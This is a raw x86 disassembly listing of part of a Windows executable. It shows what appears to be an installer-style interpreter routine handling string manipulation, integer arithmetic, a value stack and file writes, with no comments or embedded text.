  4016d5:	8b f0                	mov    %eax,%esi
  4016d7:	8d 45 08             	lea    0x8(%ebp),%eax
  4016da:	50                   	push   %eax
  4016db:	57                   	push   %edi
  4016dc:	68 00 04 00 00       	push   $0x400
  4016e1:	56                   	push   %esi
  4016e2:	ff 15 10 81 40 00    	call   *0x408110
  4016e8:	85 c0                	test   %eax,%eax
  4016ea:	74 24                	je     0x401710
  4016ec:	8b 45 08             	mov    0x8(%ebp),%eax
  4016ef:	3b c6                	cmp    %esi,%eax
  4016f1:	76 27                	jbe    0x40171a
  4016f3:	66 39 18             	cmp    %bx,(%eax)
  4016f6:	74 22                	je     0x40171a
  4016f8:	56                   	push   %esi
  4016f9:	e8 9c 51 00 00       	call   0x40689a
  4016fe:	3b c3                	cmp    %ebx,%eax
  401700:	74 0e                	je     0x401710
  401702:	83 c0 2c             	add    $0x2c,%eax
  401705:	50                   	push   %eax
  401706:	ff 75 08             	push   0x8(%ebp)
  401709:	e8 2e 4e 00 00       	call   0x40653c
  40170e:	eb 0a                	jmp    0x40171a
  401710:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401717:	66 89 1f             	mov    %bx,(%edi)
  40171a:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40171d:	0f 85 9f 14 00 00    	jne    0x402bc2
  401723:	68 00 04 00 00       	push   $0x400
  401728:	57                   	push   %edi
  401729:	57                   	push   %edi
  40172a:	ff 15 14 81 40 00    	call   *0x408114
  401730:	e9 8d 14 00 00       	jmp    0x402bc2
  401735:	6a ff                	push   $0xffffffff
  401737:	e8 02 16 00 00       	call   0x402d3e
  40173c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40173f:	51                   	push   %ecx
  401740:	57                   	push   %edi
  401741:	68 00 04 00 00       	push   $0x400
  401746:	53                   	push   %ebx
  401747:	50                   	push   %eax
  401748:	53                   	push   %ebx
  401749:	ff 15 18 81 40 00    	call   *0x408118
  40174f:	85 c0                	test   %eax,%eax
  401751:	0f 85 6b 14 00 00    	jne    0x402bc2
  401757:	e9 97 11 00 00       	jmp    0x4028f3
  40175c:	6a ef                	push   $0xffffffef
  40175e:	e8 db 15 00 00       	call   0x402d3e
  401763:	50                   	push   %eax
  401764:	57                   	push   %edi
  401765:	e8 f7 48 00 00       	call   0x406061
  40176a:	e9 45 fe ff ff       	jmp    0x4015b4
  40176f:	6a 31                	push   $0x31
  401771:	e8 c8 15 00 00       	call   0x402d3e
  401776:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401779:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40177c:	ff 75 f8             	push   -0x8(%ebp)
  40177f:	83 e0 07             	and    $0x7,%eax
  401782:	89 45 08             	mov    %eax,0x8(%ebp)
  401785:	e8 fe 46 00 00       	call   0x405e88
  40178a:	ff 75 f8             	push   -0x8(%ebp)
  40178d:	bf f8 a5 40 00       	mov    $0x40a5f8,%edi
  401792:	85 c0                	test   %eax,%eax
  401794:	74 08                	je     0x40179e
  401796:	57                   	push   %edi
  401797:	e8 a0 4d 00 00       	call   0x40653c
  40179c:	eb 17                	jmp    0x4017b5
  40179e:	68 00 60 43 00       	push   $0x436000
  4017a3:	57                   	push   %edi
  4017a4:	e8 93 4d 00 00       	call   0x40653c
  4017a9:	50                   	push   %eax
  4017aa:	e8 62 46 00 00       	call   0x405e11
  4017af:	50                   	push   %eax
  4017b0:	e8 a3 4d 00 00       	call   0x406558
  4017b5:	57                   	push   %edi
  4017b6:	e8 30 50 00 00       	call   0x4067eb
  4017bb:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017bf:	7c 31                	jl     0x4017f2
  4017c1:	57                   	push   %edi
  4017c2:	e8 d3 50 00 00       	call   0x40689a
  4017c7:	33 c9                	xor    %ecx,%ecx
  4017c9:	3b c3                	cmp    %ebx,%eax
  4017cb:	74 10                	je     0x4017dd
  4017cd:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017d0:	83 c0 14             	add    $0x14,%eax
  4017d3:	51                   	push   %ecx
  4017d4:	50                   	push   %eax
  4017d5:	ff 15 1c 81 40 00    	call   *0x40811c
  4017db:	8b c8                	mov    %eax,%ecx
  4017dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4017e0:	83 c0 fd             	add    $0xfffffffd,%eax
  4017e3:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017e8:	23 c1                	and    %ecx,%eax
  4017ea:	f7 d8                	neg    %eax
  4017ec:	1b c0                	sbb    %eax,%eax
  4017ee:	40                   	inc    %eax
  4017ef:	89 45 08             	mov    %eax,0x8(%ebp)
  4017f2:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017f5:	75 06                	jne    0x4017fd
  4017f7:	57                   	push   %edi
  4017f8:	e8 10 48 00 00       	call   0x40600d
  4017fd:	33 c0                	xor    %eax,%eax
  4017ff:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401803:	0f 95 c0             	setne  %al
  401806:	40                   	inc    %eax
  401807:	50                   	push   %eax
  401808:	68 00 00 00 40       	push   $0x40000000
  40180d:	57                   	push   %edi
  40180e:	e8 1f 48 00 00       	call   0x406032
  401813:	83 f8 ff             	cmp    $0xffffffff,%eax
  401816:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401819:	75 72                	jne    0x40188d
  40181b:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40181e:	75 4f                	jne    0x40186f
  401820:	56                   	push   %esi
  401821:	68 f8 b5 40 00       	push   $0x40b5f8
  401826:	e8 11 4d 00 00       	call   0x40653c
  40182b:	57                   	push   %edi
  40182c:	56                   	push   %esi
  40182d:	e8 0a 4d 00 00       	call   0x40653c
  401832:	ff 75 e4             	push   -0x1c(%ebp)
  401835:	68 f8 ad 40 00       	push   $0x40adf8
  40183a:	e8 3a 4d 00 00       	call   0x406579
  40183f:	68 f8 b5 40 00       	push   $0x40b5f8
  401844:	56                   	push   %esi
  401845:	e8 f2 4c 00 00       	call   0x40653c
  40184a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40184d:	c1 f8 03             	sar    $0x3,%eax
  401850:	50                   	push   %eax
  401851:	68 f8 ad 40 00       	push   $0x40adf8
  401856:	e8 47 43 00 00       	call   0x405ba2
  40185b:	83 e8 04             	sub    $0x4,%eax
  40185e:	0f 84 57 ff ff ff    	je     0x4017bb
  401864:	48                   	dec    %eax
  401865:	74 1b                	je     0x401882
  401867:	57                   	push   %edi
  401868:	6a fa                	push   $0xfffffffa
  40186a:	e9 24 fc ff ff       	jmp    0x401493
  40186f:	ff 75 f8             	push   -0x8(%ebp)
  401872:	6a e2                	push   $0xffffffe2
  401874:	e8 2b 3d 00 00       	call   0x4055a4
  401879:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40187d:	e9 34 fd ff ff       	jmp    0x4015b6
  401882:	ff 05 08 a3 42 00    	incl   0x42a308
  401888:	e9 3e 13 00 00       	jmp    0x402bcb
  40188d:	ff 75 f8             	push   -0x8(%ebp)
  401890:	6a ea                	push   $0xffffffea
  401892:	e8 0d 3d 00 00       	call   0x4055a4
  401897:	ff 05 34 a3 42 00    	incl   0x42a334
  40189d:	53                   	push   %ebx
  40189e:	53                   	push   %ebx
  40189f:	ff 75 c8             	push   -0x38(%ebp)
  4018a2:	ff 75 d8             	push   -0x28(%ebp)
  4018a5:	e8 5f 1a 00 00       	call   0x403309
  4018aa:	ff 0d 34 a3 42 00    	decl   0x42a334
  4018b0:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018b4:	8b f0                	mov    %eax,%esi
  4018b6:	75 06                	jne    0x4018be
  4018b8:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018bc:	74 12                	je     0x4018d0
  4018be:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018c1:	50                   	push   %eax
  4018c2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018c5:	53                   	push   %ebx
  4018c6:	50                   	push   %eax
  4018c7:	ff 75 c8             	push   -0x38(%ebp)
  4018ca:	ff 15 20 81 40 00    	call   *0x408120
  4018d0:	ff 75 c8             	push   -0x38(%ebp)
  4018d3:	ff 15 24 81 40 00    	call   *0x408124
  4018d9:	3b f3                	cmp    %ebx,%esi
  4018db:	0f 8d e1 12 00 00    	jge    0x402bc2
  4018e1:	83 fe fe             	cmp    $0xfffffffe,%esi
  4018e4:	75 13                	jne    0x4018f9
  4018e6:	6a e9                	push   $0xffffffe9
  4018e8:	57                   	push   %edi
  4018e9:	e8 8b 4c 00 00       	call   0x406579
  4018ee:	ff 75 f8             	push   -0x8(%ebp)
  4018f1:	57                   	push   %edi
  4018f2:	e8 61 4c 00 00       	call   0x406558
  4018f7:	eb 08                	jmp    0x401901
  4018f9:	6a ee                	push   $0xffffffee
  4018fb:	57                   	push   %edi
  4018fc:	e8 78 4c 00 00       	call   0x406579
  401901:	68 10 00 20 00       	push   $0x200010
  401906:	57                   	push   %edi
  401907:	e9 84 0a 00 00       	jmp    0x402390
  40190c:	53                   	push   %ebx
  40190d:	eb 34                	jmp    0x401943
  40190f:	6a 31                	push   $0x31
  401911:	e8 28 14 00 00       	call   0x402d3e
  401916:	ff 75 d0             	push   -0x30(%ebp)
  401919:	50                   	push   %eax
  40191a:	e8 83 42 00 00       	call   0x405ba2
  40191f:	3b c3                	cmp    %ebx,%eax
  401921:	0f 84 fe 0f 00 00    	je     0x402925
  401927:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  40192a:	0f 84 6c 01 00 00    	je     0x401a9c
  401930:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  401933:	0f 85 89 12 00 00    	jne    0x402bc2
  401939:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40193c:	e9 8c 12 00 00       	jmp    0x402bcd
  401941:	6a f0                	push   $0xfffffff0
  401943:	e8 f6 13 00 00       	call   0x402d3e
  401948:	ff 75 d4             	push   -0x2c(%ebp)
  40194b:	50                   	push   %eax
  40194c:	e8 fd 42 00 00       	call   0x405c4e
  401951:	e9 6c 12 00 00       	jmp    0x402bc2
  401956:	6a 01                	push   $0x1
  401958:	e8 e1 13 00 00       	call   0x402d3e
  40195d:	50                   	push   %eax
  40195e:	e8 ef 4b 00 00       	call   0x406552
  401963:	e9 c8 0c 00 00       	jmp    0x402630
  401968:	6a 02                	push   $0x2
  40196a:	e8 ad 13 00 00       	call   0x402d1c
  40196f:	6a 03                	push   $0x3
  401971:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401974:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401977:	e8 a0 13 00 00       	call   0x402d1c
  40197c:	59                   	pop    %ecx
  40197d:	8b f0                	mov    %eax,%esi
  40197f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401982:	59                   	pop    %ecx
  401983:	6a 01                	push   $0x1
  401985:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  401988:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40198b:	89 45 08             	mov    %eax,0x8(%ebp)
  40198e:	e8 ab 13 00 00       	call   0x402d3e
  401993:	50                   	push   %eax
  401994:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401997:	e8 b6 4b 00 00       	call   0x406552
  40199c:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  40199f:	66 89 1f             	mov    %bx,(%edi)
  4019a2:	75 03                	jne    0x4019a7
  4019a4:	89 45 08             	mov    %eax,0x8(%ebp)
  4019a7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019aa:	0f 84 12 12 00 00    	je     0x402bc2
  4019b0:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019b3:	3b cb                	cmp    %ebx,%ecx
  4019b5:	7d 0b                	jge    0x4019c2
  4019b7:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019ba:	3b f3                	cmp    %ebx,%esi
  4019bc:	0f 8c 00 12 00 00    	jl     0x402bc2
  4019c2:	3b f0                	cmp    %eax,%esi
  4019c4:	7e 02                	jle    0x4019c8
  4019c6:	8b f0                	mov    %eax,%esi
  4019c8:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019cb:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019ce:	50                   	push   %eax
  4019cf:	57                   	push   %edi
  4019d0:	e8 67 4b 00 00       	call   0x40653c
  4019d5:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d8:	7d 0e                	jge    0x4019e8
  4019da:	57                   	push   %edi
  4019db:	e8 72 4b 00 00       	call   0x406552
  4019e0:	01 45 08             	add    %eax,0x8(%ebp)
  4019e3:	79 03                	jns    0x4019e8
  4019e5:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4019eb:	3d 00 04 00 00       	cmp    $0x400,%eax
  4019f0:	0f 8d cc 11 00 00    	jge    0x402bc2
  4019f6:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  4019fa:	e9 c3 11 00 00       	jmp    0x402bc2
  4019ff:	6a 20                	push   $0x20
  401a01:	e8 38 13 00 00       	call   0x402d3e
  401a06:	6a 31                	push   $0x31
  401a08:	8b f0                	mov    %eax,%esi
  401a0a:	e8 2f 13 00 00       	call   0x402d3e
  401a0f:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a12:	50                   	push   %eax
  401a13:	56                   	push   %esi
  401a14:	75 12                	jne    0x401a28
  401a16:	ff 15 28 81 40 00    	call   *0x408128
  401a1c:	85 c0                	test   %eax,%eax
  401a1e:	75 7c                	jne    0x401a9c
  401a20:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a23:	e9 a5 11 00 00       	jmp    0x402bcd
  401a28:	ff 15 2c 81 40 00    	call   *0x40812c
  401a2e:	eb ec                	jmp    0x401a1c
  401a30:	33 f6                	xor    %esi,%esi
  401a32:	46                   	inc    %esi
  401a33:	56                   	push   %esi
  401a34:	e8 05 13 00 00       	call   0x402d3e
  401a39:	68 00 04 00 00       	push   $0x400
  401a3e:	57                   	push   %edi
  401a3f:	50                   	push   %eax
  401a40:	89 45 08             	mov    %eax,0x8(%ebp)
  401a43:	ff 15 30 81 40 00    	call   *0x408130
  401a49:	85 c0                	test   %eax,%eax
  401a4b:	74 13                	je     0x401a60
  401a4d:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a50:	74 14                	je     0x401a66
  401a52:	57                   	push   %edi
  401a53:	ff 75 08             	push   0x8(%ebp)
  401a56:	ff 15 2c 81 40 00    	call   *0x40812c
  401a5c:	85 c0                	test   %eax,%eax
  401a5e:	75 06                	jne    0x401a66
  401a60:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a63:	66 89 1f             	mov    %bx,(%edi)
  401a66:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a6d:	e9 50 11 00 00       	jmp    0x402bc2
  401a72:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401a75:	53                   	push   %ebx
  401a76:	e8 a1 12 00 00       	call   0x402d1c
  401a7b:	6a 01                	push   $0x1
  401a7d:	8b f8                	mov    %eax,%edi
  401a7f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401a82:	e8 95 12 00 00       	call   0x402d1c
  401a87:	59                   	pop    %ecx
  401a88:	3b f3                	cmp    %ebx,%esi
  401a8a:	59                   	pop    %ecx
  401a8b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401a8e:	75 08                	jne    0x401a98
  401a90:	3b f8                	cmp    %eax,%edi
  401a92:	7c 08                	jl     0x401a9c
  401a94:	7e 8a                	jle    0x401a20
  401a96:	eb 12                	jmp    0x401aaa
  401a98:	3b f8                	cmp    %eax,%edi
  401a9a:	73 08                	jae    0x401aa4
  401a9c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a9f:	e9 29 11 00 00       	jmp    0x402bcd
  401aa4:	0f 86 76 ff ff ff    	jbe    0x401a20
  401aaa:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401aad:	e9 1b 11 00 00       	jmp    0x402bcd
  401ab2:	6a 01                	push   $0x1
  401ab4:	e8 63 12 00 00       	call   0x402d1c
  401ab9:	8b f0                	mov    %eax,%esi
  401abb:	6a 02                	push   $0x2
  401abd:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ac0:	89 75 08             	mov    %esi,0x8(%ebp)
  401ac3:	e8 54 12 00 00       	call   0x402d1c
  401ac8:	59                   	pop    %ecx
  401ac9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401acc:	59                   	pop    %ecx
  401acd:	8b c8                	mov    %eax,%ecx
  401acf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ad2:	83 f8 0d             	cmp    $0xd,%eax
  401ad5:	0f 87 94 00 00 00    	ja     0x401b6f
  401adb:	ff 24 85 e4 2c 40 00 	jmp    *0x402ce4(,%eax,4)
  401ae2:	03 f1                	add    %ecx,%esi
  401ae4:	e9 5f 03 00 00       	jmp    0x401e48
  401ae9:	2b f1                	sub    %ecx,%esi
  401aeb:	e9 58 03 00 00       	jmp    0x401e48
  401af0:	0f af ce             	imul   %esi,%ecx
  401af3:	eb 1a                	jmp    0x401b0f
  401af5:	3b cb                	cmp    %ebx,%ecx
  401af7:	74 53                	je     0x401b4c
  401af9:	8b c6                	mov    %esi,%eax
  401afb:	99                   	cltd
  401afc:	f7 f9                	idiv   %ecx
  401afe:	8b f0                	mov    %eax,%esi
  401b00:	e9 43 03 00 00       	jmp    0x401e48
  401b05:	0b ce                	or     %esi,%ecx
  401b07:	eb 06                	jmp    0x401b0f
  401b09:	23 ce                	and    %esi,%ecx
  401b0b:	eb 02                	jmp    0x401b0f
  401b0d:	33 ce                	xor    %esi,%ecx
  401b0f:	8b f1                	mov    %ecx,%esi
  401b11:	e9 32 03 00 00       	jmp    0x401e48
  401b16:	33 c0                	xor    %eax,%eax
  401b18:	3b f3                	cmp    %ebx,%esi
  401b1a:	0f 94 c0             	sete   %al
  401b1d:	eb df                	jmp    0x401afe
  401b1f:	3b f3                	cmp    %ebx,%esi
  401b21:	75 11                	jne    0x401b34
  401b23:	eb 0b                	jmp    0x401b30
  401b25:	33 f6                	xor    %esi,%esi
  401b27:	e9 1c 03 00 00       	jmp    0x401e48
  401b2c:	3b f3                	cmp    %ebx,%esi
  401b2e:	74 f5                	je     0x401b25
  401b30:	3b cb                	cmp    %ebx,%ecx
  401b32:	74 f1                	je     0x401b25
  401b34:	33 f6                	xor    %esi,%esi
  401b36:	46                   	inc    %esi
  401b37:	e9 0c 03 00 00       	jmp    0x401e48
  401b3c:	3b cb                	cmp    %ebx,%ecx
  401b3e:	74 0c                	je     0x401b4c
  401b40:	8b c6                	mov    %esi,%eax
  401b42:	99                   	cltd
  401b43:	f7 f9                	idiv   %ecx
  401b45:	8b f2                	mov    %edx,%esi
  401b47:	e9 fc 02 00 00       	jmp    0x401e48
  401b4c:	33 f6                	xor    %esi,%esi
  401b4e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b55:	e9 ee 02 00 00       	jmp    0x401e48
  401b5a:	d3 e6                	shl    %cl,%esi
  401b5c:	e9 e7 02 00 00       	jmp    0x401e48
  401b61:	d3 fe                	sar    %cl,%esi
  401b63:	e9 e0 02 00 00       	jmp    0x401e48
  401b68:	d3 ee                	shr    %cl,%esi
  401b6a:	e9 d9 02 00 00       	jmp    0x401e48
  401b6f:	8b 75 08             	mov    0x8(%ebp),%esi
  401b72:	e9 d1 02 00 00       	jmp    0x401e48
  401b77:	6a 01                	push   $0x1
  401b79:	e8 c0 11 00 00       	call   0x402d3e
  401b7e:	6a 02                	push   $0x2
  401b80:	8b f0                	mov    %eax,%esi
  401b82:	e8 95 11 00 00       	call   0x402d1c
  401b87:	50                   	push   %eax
  401b88:	56                   	push   %esi
  401b89:	57                   	push   %edi
  401b8a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401b8d:	ff 15 54 82 40 00    	call   *0x408254
  401b93:	83 c4 10             	add    $0x10,%esp
  401b96:	e9 27 10 00 00       	jmp    0x402bc2
  401b9b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b9e:	8b 35 58 ce 40 00    	mov    0x40ce58,%esi
  401ba4:	3b c3                	cmp    %ebx,%eax
  401ba6:	74 44                	je     0x401bec
  401ba8:	48                   	dec    %eax
  401ba9:	3b f3                	cmp    %ebx,%esi
  401bab:	0f 84 d1 07 00 00    	je     0x402382
  401bb1:	8b 36                	mov    (%esi),%esi
  401bb3:	3b c3                	cmp    %ebx,%eax
  401bb5:	75 f1                	jne    0x401ba8
  401bb7:	3b f3                	cmp    %ebx,%esi
  401bb9:	0f 84 c3 07 00 00    	je     0x402382
  401bbf:	83 c6 04             	add    $0x4,%esi
  401bc2:	bf f8 a5 40 00       	mov    $0x40a5f8,%edi
  401bc7:	56                   	push   %esi
  401bc8:	57                   	push   %edi
  401bc9:	e8 6e 49 00 00       	call   0x40653c
  401bce:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401bd3:	83 c0 04             	add    $0x4,%eax
  401bd6:	50                   	push   %eax
  401bd7:	56                   	push   %esi
  401bd8:	e8 5f 49 00 00       	call   0x40653c
  401bdd:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401be2:	57                   	push   %edi
  401be3:	83 c0 04             	add    $0x4,%eax
  401be6:	50                   	push   %eax
  401be7:	e9 8f 0e 00 00       	jmp    0x402a7b
  401bec:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401bef:	74 25                	je     0x401c16
  401bf1:	3b f3                	cmp    %ebx,%esi
  401bf3:	0f 84 2c 0d 00 00    	je     0x402925
  401bf9:	8d 46 04             	lea    0x4(%esi),%eax
  401bfc:	50                   	push   %eax
  401bfd:	57                   	push   %edi
  401bfe:	e8 39 49 00 00       	call   0x40653c
  401c03:	8b 06                	mov    (%esi),%eax
  401c05:	56                   	push   %esi
  401c06:	a3 58 ce 40 00       	mov    %eax,0x40ce58
  401c0b:	ff 15 34 81 40 00    	call   *0x408134
  401c11:	e9 ac 0f 00 00       	jmp    0x402bc2
  401c16:	68 04 08 00 00       	push   $0x804
  401c1b:	6a 40                	push   $0x40
  401c1d:	ff 15 38 81 40 00    	call   *0x408138
  401c23:	ff 75 d0             	push   -0x30(%ebp)
  401c26:	8b f0                	mov    %eax,%esi
  401c28:	8d 46 04             	lea    0x4(%esi),%eax
  401c2b:	50                   	push   %eax
  401c2c:	e8 48 49 00 00       	call   0x406579
  401c31:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401c36:	89 06                	mov    %eax,(%esi)
  401c38:	89 35 58 ce 40 00    	mov    %esi,0x40ce58
  401c3e:	e9 7f 0f 00 00       	jmp    0x402bc2
  401c43:	6a 03                	push   $0x3
  401c45:	e8 d2 10 00 00       	call   0x402d1c
  401c4a:	6a 04                	push   $0x4
  401c4c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c4f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c52:	e8 c5 10 00 00       	call   0x402d1c
  401c57:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c5b:	59                   	pop    %ecx
  401c5c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c5f:	59                   	pop    %ecx
  401c60:	89 45 08             	mov    %eax,0x8(%ebp)
  401c63:	74 0a                	je     0x401c6f
  401c65:	6a 33                	push   $0x33
  401c67:	e8 d2 10 00 00       	call   0x402d3e
  401c6c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c6f:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c73:	74 0a                	je     0x401c7f
  401c75:	6a 44                	push   $0x44
  401c77:	e8 c2 10 00 00       	call   0x402d3e
  401c7c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c7f:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401c83:	6a 01                	push   $0x1
  401c85:	75 4c                	jne    0x401cd3
  401c87:	e8 90 10 00 00       	call   0x402d1c
  401c8c:	6a 02                	push   $0x2
  401c8e:	8b f0                	mov    %eax,%esi
  401c90:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c93:	e8 84 10 00 00       	call   0x402d1c
  401c98:	59                   	pop    %ecx
  401c99:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c9c:	59                   	pop    %ecx
  401c9d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ca0:	c1 f9 02             	sar    $0x2,%ecx
  401ca3:	74 1e                	je     0x401cc3
  401ca5:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401ca8:	52                   	push   %edx
  401ca9:	51                   	push   %ecx
  401caa:	53                   	push   %ebx
  401cab:	ff 75 08             	push   0x8(%ebp)
  401cae:	ff 75 e8             	push   -0x18(%ebp)
  401cb1:	50                   	push   %eax
  401cb2:	56                   	push   %esi
  401cb3:	ff 15 58 82 40 00    	call   *0x408258
  401cb9:	f7 d8                	neg    %eax
  401cbb:	1b c0                	sbb    %eax,%eax
  401cbd:	40                   	inc    %eax
  401cbe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401cc1:	eb 43                	jmp    0x401d06
  401cc3:	ff 75 08             	push   0x8(%ebp)
  401cc6:	ff 75 e8             	push   -0x18(%ebp)
  401cc9:	50                   	push   %eax
  401cca:	56                   	push   %esi
  401ccb:	ff 15 80 82 40 00    	call   *0x408280
  401cd1:	eb 30                	jmp    0x401d03
  401cd3:	e8 66 10 00 00       	call   0x402d3e
  401cd8:	6a 12                	push   $0x12
  401cda:	8b f0                	mov    %eax,%esi
  401cdc:	e8 5d 10 00 00       	call   0x402d3e
  401ce1:	66 8b 08             	mov    (%eax),%cx
  401ce4:	66 f7 d9             	neg    %cx
  401ce7:	1b c9                	sbb    %ecx,%ecx
  401ce9:	23 c8                	and    %eax,%ecx
  401ceb:	66 8b 06             	mov    (%esi),%ax
  401cee:	66 f7 d8             	neg    %ax
  401cf1:	1b c0                	sbb    %eax,%eax
  401cf3:	51                   	push   %ecx
  401cf4:	23 c6                	and    %esi,%eax
  401cf6:	50                   	push   %eax
  401cf7:	ff 75 08             	push   0x8(%ebp)
  401cfa:	ff 75 e8             	push   -0x18(%ebp)
  401cfd:	ff 15 5c 82 40 00    	call   *0x40825c
  401d03:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d06:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d09:	0f 8c b3 0e 00 00    	jl     0x402bc2
  401d0f:	ff 75 c8             	push   -0x38(%ebp)
  401d12:	e9 56 f8 ff ff       	jmp    0x40156d
  401d17:	53                   	push   %ebx
  401d18:	e8 ff 0f 00 00       	call   0x402d1c
  401d1d:	59                   	pop    %ecx
  401d1e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d21:	50                   	push   %eax
  401d22:	ff 15 60 82 40 00    	call   *0x408260
  401d28:	85 c0                	test   %eax,%eax
  401d2a:	0f 84 f0 fc ff ff    	je     0x401a20
  401d30:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d33:	e9 95 0e 00 00       	jmp    0x402bcd
  401d38:	6a 02                	push   $0x2
  401d3a:	e8 dd 0f 00 00       	call   0x402d1c
  401d3f:	6a 01                	push   $0x1
  401d41:	8b f0                	mov    %eax,%esi
  401d43:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d46:	e8 d1 0f 00 00       	call   0x402d1c
  401d4b:	59                   	pop    %ecx
  401d4c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4f:	59                   	pop    %ecx
  401d50:	56                   	push   %esi
  401d51:	50                   	push   %eax
  401d52:	ff 15 64 82 40 00    	call   *0x408264
  401d58:	e9 d3 08 00 00       	jmp    0x402630
  401d5d:	a1 c8 a2 42 00       	mov    0x42a2c8,%eax
  401d62:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d65:	53                   	push   %ebx
  401d66:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d69:	e8 ae 0f 00 00       	call   0x402d1c
  401d6e:	59                   	pop    %ecx
  401d6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d72:	56                   	push   %esi
  401d73:	6a eb                	push   $0xffffffeb
  401d75:	50                   	push   %eax
  401d76:	ff 15 68 82 40 00    	call   *0x408268
  401d7c:	e9 41 0e 00 00       	jmp    0x402bc2
  401d81:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401d85:	74 0d                	je     0x401d94
  401d87:	6a 02                	push   $0x2
  401d89:	e8 8e 0f 00 00       	call   0x402d1c
  401d8e:	59                   	pop    %ecx
  401d8f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d92:	eb 0c                	jmp    0x401da0
  401d94:	ff 75 d8             	push   -0x28(%ebp)
  401d97:	ff 75 f8             	push   -0x8(%ebp)
  401d9a:	ff 15 64 82 40 00    	call   *0x408264
  401da0:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401da3:	89 45 08             	mov    %eax,0x8(%ebp)
  401da6:	8b c1                	mov    %ecx,%eax
  401da8:	8b f1                	mov    %ecx,%esi
  401daa:	83 e0 03             	and    $0x3,%eax
  401dad:	83 e6 04             	and    $0x4,%esi
  401db0:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401db3:	8b c1                	mov    %ecx,%eax
  401db5:	c1 e8 1f             	shr    $0x1f,%eax
  401db8:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401dbb:	8b c1                	mov    %ecx,%eax
  401dbd:	c1 e8 1e             	shr    $0x1e,%eax
  401dc0:	83 e0 01             	and    $0x1,%eax
  401dc3:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401dc9:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401dcc:	74 09                	je     0x401dd7
